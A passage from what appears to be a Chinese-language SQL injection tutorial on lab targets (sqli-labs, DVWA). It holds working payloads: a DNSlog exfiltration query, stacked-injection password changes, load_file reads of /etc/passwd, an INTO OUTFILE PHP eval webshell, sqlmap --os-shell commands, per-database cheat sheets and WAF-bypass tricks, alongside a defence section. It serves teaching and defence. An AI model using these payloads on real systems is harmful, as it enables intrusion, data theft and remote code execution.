class="string">&#x27;.yeuude.ceye.io\\AB&#x27;</span>))#</span><br></pre></td></tr></table></figure><p><img src="/img/20220926181828.png"></p><p><strong>攻击</strong></p><p>1.ceye.io容易被加黑名单，可以自己搭建一个dnslog服务器。</p><p><strong>防御</strong></p><p>1.黑名单：把<code>*.ceye.io</code>和<code>*dnslog.cn</code>在本地hosts文件都解析成127.0.0.1，截断数据流，让这些域名的解析都不出网不经过dns服务器。</p><p>2.白名单：只允许解析某些必要的域名。</p><p>3.看服务器出网日志：如果自己的服务器访问了一些意料之外的网站，严谨排查。</p><p>4.换成linux系统。</p><h1 id="8-二阶注入"><a href="#8-二阶注入" class="headerlink" title="8 二阶注入"></a>8 二阶注入</h1><p>在以前有一种二阶注入，注入页面和回显页面不一个页面，那时候sqlmap有一个参数叫–seconder-order，用法如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;url1&quot; <span class="comment">--seconder-order=&quot;url2&quot;</span></span><br><span class="line">#在url1执行注入语句，监听url2</span><br></pre></td></tr></table></figure><p>现在已经没有这种二阶注入了，sqlmap也取消了这个参数。</p><p>现在说二阶注入是，引用之前存入数据库的脏数据实现注入。</p><p>比如在某平台注册了一个用户名为admin#或者admin’#的用户，然后修改此用户的密码。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">假如修改密码时数据库内语句如下：</span><br><span class="line"><span class="keyword">update</span> passwd<span class="operator">=</span>$pass <span class="keyword">where</span> username<span class="operator">=</span>admin    #正常用户下修改密码</span><br><span class="line"><span class="keyword">update</span> passwd<span class="operator">=</span>$pass <span class="keyword">where</span> username<span class="operator">=</span>admin#   #恶意用户修改密码，实际上是修改zhangsan的密码</span><br></pre></td></tr></table></figure><p>sqli-lib第24关就是一个注册改密码的二阶注入。</p><p>也叫二次注入，可以概括为以下两步: </p><ul><li>第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li><li>第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li></ul><p>大概意思就是注册的地方不存在SQL注入，修改密码的地方也不存在SQL注入，但是两者结合可以修改admin用户的密码。</p><h1 id="9-宽字节注入"><a href="#9-宽字节注入" class="headerlink" title="9 宽字节注入"></a>9 宽字节注入</h1><p>宽字节注入是数据库编码采用GBK编码时所产生的漏洞。尽管现在使用GBK编码的数据库已不多见，但由于这个漏洞绕过网站转义机制的经典性，仍然具有很大的启发意义。</p><p>下图为MariaDB默认的编码，通过 <code>alter database [数据库名] character set [字符集名]</code>，可以修改数据库编码。如果改为GBK编码，这一漏洞就会存在。</p><p><img src="/img/20220926190907.png"></p><p>以sqli-lab的第32关为例。</p><p>当我们输入<code>&#39;</code>时，网站防御机制利用 <code>\</code> 对 <code>&#39;</code> 进行转义，使 <code>&#39;</code> 被看做一个字符而非数据库查询语句。</p><p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%ab%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围,如%ab，%df）。</p><p><code>%27</code> 就是单引号会被转义成 <code>\&#39;</code> 也就是 <code>%5c%27</code> ，如果我们输入 <code>%ab%27</code> ，在后台 <code>%5c</code> 插入到单引号 <code>%27</code> 前，<code>%ab%5c</code>组成一个汉字，使得单引号重新起作用。</p><h1 id="10-堆叠注入"><a href="#10-堆叠注入" class="headerlink" title="10 堆叠注入"></a>10 堆叠注入</h1><p>mysql数据库sql语句的默认结束符是以”;”号结尾，在执行多条sql语句时就要使用结束符隔开，而堆叠注入其实就是通过结束符来执行多条sql语句。</p><p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服<br>务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p><ul><li>目标存在sql注入漏洞</li><li>目标未对”;”号进行过滤</li><li>目标中间层查询数据库信息时可同时执行多条sql语句</li></ul><p>数据库的堆叠查询可以执行多条语句，多语句之间可以用分号隔开。</p><p>堆叠注入就是利用这个特点，可以在第二个SQL语句中构造自己要执行的语句。</p><p>以下例子出自sqli-lab第38关。</p><p><img src="/img/20220926193458.png"></p><p>注入如下语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where username=&#x27;</span>Dumb<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/20220926193516.png"></p><h1 id="11-利用SQL注入读取与写入文件"><a href="#11-利用SQL注入读取与写入文件" class="headerlink" title="11 利用SQL注入读取与写入文件"></a>11 利用SQL注入读取与写入文件</h1><h2 id="11-1利用SQL注入读取文件"><a href="#11-1利用SQL注入读取文件" class="headerlink" title="11.1利用SQL注入读取文件"></a>11.1利用SQL注入读取文件</h2><p>利用load_file()函数可以读取数据库有权限读取的文件。</p><p>如，读&#x2F;etc&#x2F;passwd，因为这个文件所有用户都有读取权限，所以用作演示。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,load_file(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;);#</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230618103115.png"></p><h2 id="11-2-利用SQL注入写入文件"><a href="#11-2-利用SQL注入写入文件" class="headerlink" title="11.2 利用SQL注入写入文件"></a>11.2 利用SQL注入写入文件</h2><p>利用outfile函数可以在数据库有写权限的目录写入文件。</p><h3 id="11-2-1-将数据库查询结果写入文件"><a href="#11-2-1-将数据库查询结果写入文件" class="headerlink" title="11.2.1 将数据库查询结果写入文件"></a>11.2.1 将数据库查询结果写入文件</h3><p>如将对user和password的查询结果写入&#x2F;var&#x2F;www&#x2F;html目录下命名为1.bak的文件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select user,password from users into outfile &#x27;/var/www/html/1.bak&#x27;#</span><br></pre></td></tr></table></figure><p><img src="/img/20230618103310.png"></p><p>出现这种报错是因为数据库在&#x2F;var&#x2F;www&#x2F;html目录下没有写入权限。</p><p>我们作弊，给这个目录777权限。然后重新执行此语句。</p><p><img src="/img/20230618103357.png"></p><p>查看服务器发现文件成功写入 或者通过web下载文件。</p><p><img src="/img/20230618103439.png"></p><p><img src="/img/20230618103518.png"></p><p><img src="/img/20230618103534.png"></p><p>其中密码为MD5加密的值，可以在MD5在线解密网站解密<a href="https://www.bejson.com/enc/md5dsc/">https://www.bejson.com/enc/md5dsc/</a></p><p><img src="/img/20230618103605.png"></p><h3 id="11-2-2-写入一句话木马"><a href="#11-2-2-写入一句话木马" class="headerlink" title="11.2.2 写入一句话木马"></a>11.2.2 写入一句话木马</h3><p>利用outfile函数可以将一句话木马写入到一个文件内，并保存在数据库有写入权限的web路径下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and 1=2 union select 1,&#x27;&lt;?php @eval($_POST[123])?&gt;&#x27; into outfile &#x27;/var/www/html/111.php&#x27;#</span><br></pre></td></tr></table></figure><p><img src="/img/20230618103734.png"></p><p>我们作弊查看服务器该路径，发现已经写入了文件。</p><p><img src="/img/20230618103833.png"></p><p>浏览器访问这个文件，发现其存在，空白说明php代码已被解析。</p><p><img src="/img/20230618103901.png"></p><p>我们可以用蚁剑工具连接这个webshell。</p><p><img src="/img/20230618114537.png"></p><p><img src="/img/20230618114646.png"></p><h3 id="11-2-3-利用sqlmap获得shell权限"><a href="#11-2-3-利用sqlmap获得shell权限" class="headerlink" title="11.2.3 利用sqlmap获得shell权限"></a>11.2.3 利用sqlmap获得shell权限</h3><p>Sqlmap证明存在注入并确保有dba权限。所谓DBA权限就是数据库的最大权限。在MariaDB数据库中一般为root。在sql注入中，只要注入权限为DBA用户所管理的库时，才能行使数据库的完整权限，执行文件写入等操作。前文手注写入木马也是基于这个前提。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.112/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=vmhebkhe3pl91nmpij1kfnr7f7; security=low&quot; --is-dba</span><br></pre></td></tr></table></figure><p><img src="/img/20230618114917.png"></p><p><code>current user is DBA: True</code>代表其具备DBA权限。</p><p>在sqlmap中<code>--os-shell</code>代表sqlmap将尝试获取shell。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.112/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=vmhebkhe3pl91nmpij1kfnr7f7; security=low&quot; --os-shell</span><br></pre></td></tr></table></figure><p>选择对相应的中间件类型，这里用的lamp,所以选PHP</p><p><img src="/img/20230618114948.png"></p><p>选择2制定web站点路径</p><p><img src="/img/20230618115020.png"></p><p>输入上传目录&#x2F;var&#x2F;www&#x2F;html</p><p><img src="/img/20230618115053.png"></p><p>获得os shell</p><p><img src="/img/20230618115153.png"></p><h1 id="12-sql防御"><a href="#12-sql防御" class="headerlink" title="12 sql防御"></a>12 sql防御</h1><ol><li>waf</li><li>不用数据库的root用户，独立数据库用户，并且权限控制唯一（丢数据的损失可控）</li><li>系统的MySQL、Apache用户权限控制，让MySQL用户无权限访问web目录，权限控制</li><li>站库分离，通过漏洞往MySQL服务器写的文件，web服务器站点无法访问到，就无法通过webshell工具连接。</li><li>代码层面的修复，过滤等等。</li></ol><p><img src="/img/20230618114356.png"></p><h3 id="1-过滤"><a href="#1-过滤" class="headerlink" title="1 过滤"></a>1 过滤</h3><p>可以对用户提交的敏感字符进行过滤和拦截。</p><h3 id="2-转义"><a href="#2-转义" class="headerlink" title="2 转义"></a>2 转义</h3><p>可以对用户提交的敏感字符进行转义。</p><h3 id="3-参数化查询"><a href="#3-参数化查询" class="headerlink" title="3 参数化查询"></a>3 参数化查询</h3><p>参数化查询也叫做预处理，它分两个步骤处理用户的输入。</p><ul><li>网站应用程序指定了查询语句结构，并为用户输入的每个数据预留了占位符。</li><li>网站应用程序指定每个占位符的内容。</li></ul><p>在第二个步骤中，用户输入被填入占位符，但不会改变第一个步骤中预设好的查询语句结构。这样，网站应用程序就不会将用户输入判断为sql语句执行了，而会把用户的输入当做一个整体去查询。</p><h3 id="4-加密存储"><a href="#4-加密存储" class="headerlink" title="4 加密存储"></a>4 加密存储</h3><p>对重要数据，不在表单中明文存储，而选择加密存储。</p><h3 id="5-限制数据库权限和特权"><a href="#5-限制数据库权限和特权" class="headerlink" title="5 限制数据库权限和特权"></a>5 限制数据库权限和特权</h3><p>将数据库用户的功能设置为最低要求；这将限制攻击者在设法获取访问权限时可以执行的操作。</p><h1 id="13-SQL注入绕过网站防御机制"><a href="#13-SQL注入绕过网站防御机制" class="headerlink" title="13 SQL注入绕过网站防御机制"></a>13 SQL注入绕过网站防御机制</h1><h2 id="1-SQL注入的一些细节"><a href="#1-SQL注入的一些细节" class="headerlink" title="1. SQL注入的一些细节"></a>1. SQL注入的一些细节</h2><p>当我们远程测试网站是否存在SQL注入，常常需要通过推理来进行大量测试。即看到网页上的执行结果，推理后台数据库是如何操作的。</p><h3 id="1-1-可能存在SQL注入的功能点"><a href="#1-1-可能存在SQL注入的功能点" class="headerlink" title="1.1 可能存在SQL注入的功能点"></a>1.1 可能存在SQL注入的功能点</h3><p>SQL注入可以出现在任何从系统或接受用户输入的前段应用程序中。</p><p>换句话说，每个前端与后端数据库有交互的地方，都有可能存在SQL注入漏洞。</p><p>比如最常见的是在搜索和登录功能。但其他与数据库交互的地方也值得注意：如cookie中，XFF中。</p><h3 id="1-2-闭合"><a href="#1-2-闭合" class="headerlink" title="1.2 闭合"></a>1.2 闭合</h3><p>在存在注入点的网页上，其后端代码可能是如下的几种格式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = <span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = (&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>此时我们构造sql语句注入时，则要考虑闭合前面的引号括号。</p><p>因为如果注入后，破坏了原有的闭合，那么注入也会失败，所以闭合很重要，决定了最后是否可以注入成功。</p><p>如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>注入 <code>1&#39; or 1=1 --+</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;1&#x27; or 1=1 --+&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>常见的闭合形式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&#x27;$id&#x27;</span><br><span class="line">&quot;$id&quot;</span><br><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">(&quot;$id&quot;)</span><br><span class="line">((&#x27;id&#x27;))</span><br><span class="line"></span><br><span class="line">闭合代码：</span><br><span class="line">1&#x27; #</span><br><span class="line">1&quot; #</span><br><span class="line">1&#x27;) #</span><br><span class="line">&quot;) #</span><br><span class="line">&#x27;)) #</span><br></pre></td></tr></table></figure><p>常见的注释截断方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">/*</span><br><span class="line">-- -</span><br><span class="line">;%00</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>最后，可以用and1&#x3D;1，or 1&#x3D;1 等语句确认闭合完成，漏洞存在。</p><h3 id="1-3-测试列数"><a href="#1-3-测试列数" class="headerlink" title="1.3 测试列数"></a>1.3 测试列数</h3><p>除了前文中提到的 order by 语句以外。</p><p>也可以用如下的形式来探测：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.foo.com/index.asp?id=12+union+select+null,null--</span><br></pre></td></tr></table></figure><p>不断增加 <code>null</code> 至不返回。</p><h3 id="1-4-探测数据库指纹"><a href="#1-4-探测数据库指纹" class="headerlink" title="1.4 探测数据库指纹"></a>1.4 探测数据库指纹</h3><p>在此前的实验中，我们都是使用MariaDB作为后端数据库的，其属于mysql系列数据库。</p><p>如果后端数据库不同，那么SQL注入的语句也会不同。有几种探测数据库指纹信息：</p><ol><li>第一种方法找出使用后端数据库是通过观察返回的错误应用程序。 以下是一些例子的错误消息:</li></ol><p>MySql:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manualthat corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> theright syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>Oracle:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORA-00933: SQL command not properly ended</span><br></pre></td></tr></table></figure><p>MS SQL Server:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft SQL Native Client error ‘80040e14’Unclosed quotation mark after the character string</span><br></pre></td></tr></table></figure><p>PostgreSQL:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Query failed: ERROR: syntax error at or near</span><br></pre></td></tr></table></figure><ol><li>常见网页与数据库的关系。</li></ol><p><strong>代码与数据库并不存在绑定关系，以下只能做参考。</strong></p><p>asp : Access&#x2F;SQLServer</p><p>php : Mysql</p><p>jsp : Oracle</p><ol><li>利用语句探测数据库</li></ol><p>一种最可靠的方法是根据数据库连接字符串方式的不同进行识别。</p><p>如我们查询字符串<code>farmsec</code>得到了一个结果，可以在请求中提交特殊的值，测试用各种方法连接，以生成<code>farmsec</code>字符串。如过查询结果相同，就可以确定是哪一种数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle:    &#x27;farm&#x27;||&#x27;sec&#x27;</span><br><span class="line">MS-SQL:    &#x27;farm&#x27;+&#x27;sec&#x27;</span><br><span class="line">MySQL:     &#x27;farm&#x27; &#x27;sec&#x27;</span><br><span class="line">PostgreSQL：&#x27;farm&#x27; || &#x27;sec&#x27;</span><br></pre></td></tr></table></figure><p>如果注入数字数据，可以使用下面的攻击语句来识别字符串。</p><p>每个语句在其对应的数据库中求值结果为0，在其他数据库中则会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle:    BITAND(1,1)-BITAND(1,1)</span><br><span class="line">MS-SQL:    @@PACK_RECEIVED-@@PACK_RECEIVED</span><br><span class="line">MySQL:     CONNECTION_ID()-CONNECTION_ID()</span><br></pre></td></tr></table></figure><h3 id="1-5-各类数据库注入语句"><a href="#1-5-各类数据库注入语句" class="headerlink" title="1.5 各类数据库注入语句"></a>1.5 各类数据库注入语句</h3><p>不同的数据库，需要用不同的sql语句注入。</p><h4 id="1-5-1-MySQL数据库"><a href="#1-5-1-MySQL数据库" class="headerlink" title="1.5.1 MySQL数据库"></a>1.5.1 MySQL数据库</h4><table><thead><tr><th>释义</th><th>SQL语句</th><th>其他</th></tr></thead><tbody><tr><td>当前数据库</td><td>SELECT database()</td><td>-</td></tr><tr><td>所有数据库</td><td>SELECT schema_name FROM information_schema.schemata</td><td>#版本&gt;5.0</td></tr><tr><td>-</td><td>SELECT distinct(db) FROM mysql.db</td><td>#管理员权限才可以执行</td></tr><tr><td>查询表名</td><td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema !&#x3D; ‘mysql’ AND table_schema !&#x3D; ‘information_schema’</td><td>-</td></tr><tr><td>查询列名</td><td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema !&#x3D; ‘mysql’ AND table_schema !&#x3D; ‘information_schema’</td><td>-</td></tr><tr><td>获取版本</td><td>SELECT @@version</td><td>-</td></tr><tr><td>当前用户</td><td>SELECT user()</td><td>-</td></tr><tr><td>-</td><td>SELECT system_user()</td><td>-</td></tr><tr><td>用户权限</td><td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges</td><td>#用户权限</td></tr><tr><td>-</td><td>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges</td><td>#数据库权限</td></tr><tr><td>-</td><td>SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges</td><td>#字段的权限</td></tr><tr><td>列出DBA账户</td><td>SELECT host, user FROM mysql.user WHERE Super_priv &#x3D; ‘Y’</td><td>-</td></tr><tr><td>选择第N行</td><td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0</td><td>#行从0开始编号</td></tr><tr><td>-</td><td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1</td><td>#行从0开始编号</td></tr><tr><td>选择第N个字符</td><td>SELECT substr(‘abcd’, 3, 1)</td><td>#返回c</td></tr><tr><td>ASCII值-字符</td><td>SELECT char(65)</td><td>#返回A</td></tr><tr><td>字符-ASCII值</td><td>SELECT ascii(‘A’)</td><td>#返回65</td></tr><tr><td>字符串连接</td><td>SELECT CONCAT(‘A’,‘B’)</td><td>#返回AB</td></tr><tr><td>-</td><td>SELECT CONCAT(‘A’,‘B’,‘C’)</td><td>#返回ABC</td></tr><tr><td>时间睡眠</td><td>SELECT BENCHMARK(1000000,MD5(‘A’))</td><td>-</td></tr><tr><td>-</td><td>SELECT SLEEP(5)</td><td>#版本&gt;&#x3D; 5.0.12</td></tr></tbody></table><h4 id="1-5-2-Oracle数据库"><a href="#1-5-2-Oracle数据库" class="headerlink" title="1.5.2 Oracle数据库"></a>1.5.2 Oracle数据库</h4><table><thead><tr><th>释义</th><th>SQL语句</th><th>其他</th><th></th></tr></thead><tbody><tr><td>当前数据库</td><td>SELECT global_name FROM global_name</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT name FROM v$database</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT instance_name FROM v$instance</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT SYS.DATABASE_NAME FROM DUAL</td><td>—</td><td></td></tr><tr><td>所有数据库</td><td>SELECT DISTINCT owner FROM all_tables</td><td>—</td><td></td></tr><tr><td>查询表名</td><td>SELECT table_name FROM all_tables</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT owner, table_name FROM all_tables</td><td>—</td><td></td></tr><tr><td>查询列名</td><td>SELECT column_name FROM all_tab_columns WHERE table_name &#x3D; ‘blah’</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT column_name FROM all_tab_columns WHERE table_name &#x3D; ‘blah’ and owner &#x3D; ‘foo’</td><td>—</td><td></td></tr><tr><td>获取版本</td><td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’</td><td>—</td><td></td></tr><tr><td>-</td><td>SELECT version FROM v$instance</td><td>—</td><td></td></tr><tr><td>当前用户</td><td>SELECT user FROM dual</td><td>—</td><td></td></tr><tr><td>用户权限</td><td>SELECT * FROM session_privs</td><td>#当前权限</td><td></td></tr><tr><td>-</td><td>SELECT * FROM dba_sys_privs WHERE grantee &#x3D; ‘DBSNMP’</td><td>#列出用户的权限</td><td></td></tr><tr><td>列出DBA账户</td><td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION &#x3D; ‘YES’</td><td>—</td><td></td></tr><tr><td>选择第N行</td><td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r&#x3D;9</td><td>#第九行</td><td></td></tr><tr><td>选择第N个字符</td><td>SELECT substr(‘abcd’, 3, 1) FROM dual</td><td>#第3个字符c</td><td></td></tr><tr><td>ASCII值-字符</td><td>SELECT chr(65) FROM dual</td><td>#返回A</td><td></td></tr><tr><td>字符-ASCII值</td><td>SELECT ascii(‘A’) FROM dual</td><td>#返回65</td><td></td></tr><tr><td>字符串连接</td><td>SELECT ‘A’ \</td><td>‘B’ FROM dual</td><td>#返回AB</td></tr><tr><td>时间睡眠</td><td>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual</td><td>#如果反向查询很慢</td><td></td></tr><tr><td>-</td><td>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual</td><td>#如果正向查询很慢</td><td></td></tr></tbody></table><h4 id="1-5-3-MSSQL数据库"><a href="#1-5-3-MSSQL数据库" class="headerlink" title="1.5.3 MSSQL数据库"></a>1.5.3 MSSQL数据库</h4><table><thead><tr><th>释义</th><th>SQL语句</th><th>其他</th></tr></thead><tbody><tr><td>当前数据库</td><td>SELECT DB_NAME()</td><td>-</td></tr><tr><td>所有数据库</td><td>SELECT name FROM master…sysdatabases</td><td>-</td></tr><tr><td>-</td><td>SELECT DB_NAME(N)</td><td>#N为0,1,2,…</td></tr><tr><td>查询表名</td><td>SELECT name FROM master…sysobjects WHERE xtype &#x3D; ‘U’</td><td>-</td></tr><tr><td>-</td><td>SELECT name FROM someotherdb…sysobjects WHERE xtype &#x3D; ‘U’</td><td>-</td></tr><tr><td>查询列名</td><td>SELECT name FROM syscolumns WHERE id &#x3D; (SELECT id FROM sysobjects WHERE name &#x3D; ‘mytable’)</td><td>#当前数据库</td></tr><tr><td>-</td><td>SELECT master…syscolumns.name, TYPE_NAME(master…syscolumns.xtype) FROM master…syscolumns, master…sysobjects WHERE master…syscolumns.id&#x3D;master…sysobjects.id AND master…sysobjects.name&#x3D;‘sometable’</td><td>#列出master…sometable的列名称</td></tr><tr><td>获取版本</td><td>SELECT @@version</td><td>-</td></tr><tr><td>当前用户</td><td>SELECT user_name()</td><td>-</td></tr><tr><td>-</td><td>SELECT system_user</td><td>-</td></tr><tr><td>-</td><td>SELECT user</td><td>-</td></tr><tr><td>用户权限</td><td>SELECT permission_name FROM master…fn_my_permissions(null,‘DATABASE’)</td><td>#当前数据库权限</td></tr><tr><td>-</td><td>SELECT is_srvrolemember(‘sysadmin’)</td><td>#当前用户权限</td></tr><tr><td>列出DBA账户</td><td>SELECT is_srvrolemember(‘sysadmin’)</td><td>#当前用户是否是管理员，是则返回1</td></tr><tr><td>选择第N行</td><td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master…syslogins ORDER BY name ASC) sq ORDER BY name DESC</td><td>#返回第九行</td></tr><tr><td>选择第N个字符</td><td>SELECT substring(‘abcd’, 3, 1)</td><td>#返回c</td></tr><tr><td>ASCII值-字符</td><td>SELECT char(0×41)</td><td>#返回A</td></tr><tr><td>字符-ASCII值</td><td>SELECT ascii(‘A’)</td><td>#返回65</td></tr><tr><td>字符串连接</td><td>SELECT ‘A’ + ‘B’</td><td>#返回AB</td></tr><tr><td>时间睡眠</td><td>WAITFOR DELAY ‘0:0:5’</td><td>#睡眠5秒</td></tr></tbody></table><h4 id="1-5-4-PostgreSQL数据库"><a href="#1-5-4-PostgreSQL数据库" class="headerlink" title="1.5.4 PostgreSQL数据库"></a>1.5.4 PostgreSQL数据库</h4><table><thead><tr><th>释义</th><th>SQL语句</th><th>其他</th><th></th></tr></thead><tbody><tr><td>当前数据库</td><td>SELECT current_database()</td><td>-</td><td></td></tr><tr><td>所有数据库</td><td>SELECT datname FROM pg_database</td><td>-</td><td></td></tr><tr><td>查询表名</td><td>SELECT relname, A.attname FROM pg_class C, pg_namespace N,pg_attribute A, pg_type T WHERE (C.relkind&#x3D;‘r’) AND (N.oid&#x3D;C.relnamespace) AND (A.attrelid&#x3D;C.oid) AND (A.atttypid&#x3D;T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td><td>-</td><td></td></tr><tr><td>查询列名</td><td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid &#x3D; c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td><td>-</td><td></td></tr><tr><td>获取版本</td><td>SELECT version()</td><td>-</td><td></td></tr><tr><td>当前用户</td><td>SELECT user;</td><td>-</td><td></td></tr><tr><td>-</td><td>SELECT current_user;</td><td>-</td><td></td></tr><tr><td>-</td><td>SELECT session_user;</td><td>-</td><td></td></tr><tr><td>-</td><td>SELECT usename FROM pg_user;</td><td>-</td><td></td></tr><tr><td>-</td><td>SELECT getpgusername();</td><td>-</td><td></td></tr><tr><td>用户权限</td><td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td><td>-</td><td></td></tr><tr><td>列出DBA账户</td><td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td><td>-</td><td></td></tr><tr><td>选择第N行</td><td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0</td><td>#从0行开始编号</td><td></td></tr><tr><td>-</td><td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td><td>-</td><td></td></tr><tr><td>选择第N个字符</td><td>SELECT substr(‘abcd’, 3, 1)</td><td>#返回c</td><td></td></tr><tr><td>ASCII值-字符</td><td>SELECT chr(65)</td><td>#返回A</td><td></td></tr><tr><td>字符-ASCII值</td><td>SELECT ascii(‘A’)</td><td>#返回65</td><td></td></tr><tr><td>字符串连接</td><td>SELECT ‘A’ \</td><td>‘B’</td><td>#返回AB</td></tr><tr><td>时间睡眠</td><td>SELECT pg_sleep(10)</td><td>#睡眠10秒</td><td></td></tr><tr><td>-</td><td>SELECT sleep(10)</td><td>#创建自定义睡眠</td><td></td></tr></tbody></table><h2 id="2-绕过网站防御机制思路"><a href="#2-绕过网站防御机制思路" class="headerlink" title="2.绕过网站防御机制思路"></a>2.绕过网站防御机制思路</h2><p>绝大部分的网站防御机制，无论是过滤、转义或是商业waf，都是基于某种正则表达式的规则匹配而运作的。也就是说，攻击者的行为一旦匹配了某种正则表达式所预料到的特征，就可能被拦截。而绕过防御机制则是，将简单的攻击语句复杂化，使其出乎编写防御程序者的意料，同时确保被复杂化的攻击语句保持原有的功效。下面将介绍几种常见的绕过思路：</p><h3 id="2-1-大小写绕过"><a href="#2-1-大小写绕过" class="headerlink" title="2.1 大小写绕过"></a>2.1 大小写绕过</h3><p>一般来说，只要网站考虑了防御机制，现在的设计者是不会忘记注意大小写的。但我们还是把绕过思路从简单到复杂的讲述出来，大小写绕过是最简单的一种绕过方法，它成功的前提是网站防御规则中只匹配了字母小写的攻击语句特征。如<code>select</code>可能会被规则发现，<code>SeLeCt</code>则不会。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fsec.com/index.php?page_id=1&#x27; and 1=2 uNIoN sELecT 1,2,3,4#</span><br></pre></td></tr></table></figure><h3 id="2-2-双写绕过"><a href="#2-2-双写绕过" class="headerlink" title="2.2 双写绕过"></a>2.2 双写绕过</h3><p>在某些网站，会对用户提交的一段字符进行匹配，对其认为危险的字符删除，同时放过余下其认为安全的字符。</p><p>例如，用户输入<code>1&#39; and 1=2 union select 